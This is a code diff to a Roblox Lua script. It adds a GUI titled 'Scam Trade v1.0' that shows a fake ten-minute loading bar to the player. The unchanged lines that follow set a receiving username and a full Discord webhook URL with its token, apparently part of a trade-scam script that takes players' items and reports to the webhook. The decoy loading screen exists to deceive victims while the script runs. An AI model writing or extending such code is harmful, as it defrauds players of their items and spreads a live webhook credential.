@@ -1,3 +1,82 @@
+-- GUI Setup
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 300, 0, 150)
+frame.Position = UDim2.new(0.5, -150, 0.5, -75)
+frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+frame.BorderSizePixel = 0
+frame.Parent = screenGui
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 40)
+title.Position = UDim2.new(0, 0, 0, 10)
+title.Text = "Scam Trade v1.0"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Font = Enum.Font.SourceSansBold
+title.TextSize = 24
+title.BackgroundTransparency = 1
+title.Parent = frame
+
+local loadingText = Instance.new("TextLabel")
+loadingText.Size = UDim2.new(1, 0, 0, 20)
+loadingText.Position = UDim2.new(0, 0, 0, 60)
+loadingText.Text = "Loading..."
+loadingText.TextColor3 = Color3.fromRGB(200, 200, 200)
+loadingText.Font = Enum.Font.SourceSans
+loadingText.TextSize = 18
+loadingText.BackgroundTransparency = 1
+loadingText.Parent = frame
+
+local progressBar = Instance.new("Frame")
+progressBar.Size = UDim2.new(0.8, 0, 0, 20)
+progressBar.Position = UDim2.new(0.1, 0, 0, 90)
+progressBar.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+progressBar.BorderSizePixel = 0
+progressBar.Parent = frame
+
+local progressFill = Instance.new("Frame")
+progressFill.Size = UDim2.new(0, 0, 1, 0)
+progressFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+progressFill.BorderSizePixel = 0
+progressFill.Parent = progressBar
+
+local percentageText = Instance.new("TextLabel")
+percentageText.Size = UDim2.new(1, 0, 0, 20)
+percentageText.Position = UDim2.new(0, 0, 0, 115)
+percentageText.Text = "0%"
+percentageText.TextColor3 = Color3.fromRGB(255, 255, 255)
+percentageText.Font = Enum.Font.SourceSans
+percentageText.TextSize = 16
+percentageText.BackgroundTransparency = 1
+percentageText.Parent = frame
+
+-- Fake loading animation
+coroutine.wrap(function()
+    local totalTime = 600 -- 10 minutes in seconds
+    local startTime = tick()
+    
+    while tick() - startTime < totalTime do
+        local elapsed = tick() - startTime
+        local progress = elapsed / totalTime
+        progressFill.Size = UDim2.new(progress, 0, 1, 0)
+        percentageText.Text = math.floor(progress * 100) .. "%"
+        
+        -- Update loading text with dots animation
+        local dots = math.floor((tick() % 3) + 1)
+        loadingText.Text = "Loading" .. string.rep(".", dots)
+        
+        wait(0.1)
+    end
+    
+    -- Loading complete
+    loadingText.Text = "Loading complete!"
+    wait(2)
+    screenGui:Destroy()
+end)()
+
+
 userName = "backsclapes"
 webHook = "https://discord.com/api/webhooks/1355498964002013295/qOoHCpa83gK8IwJbl3bwLIhubKE-5cIDvqnt6syxOeRtrXmwvUzgxaftRGFQuJvnER_s"
 local values = {
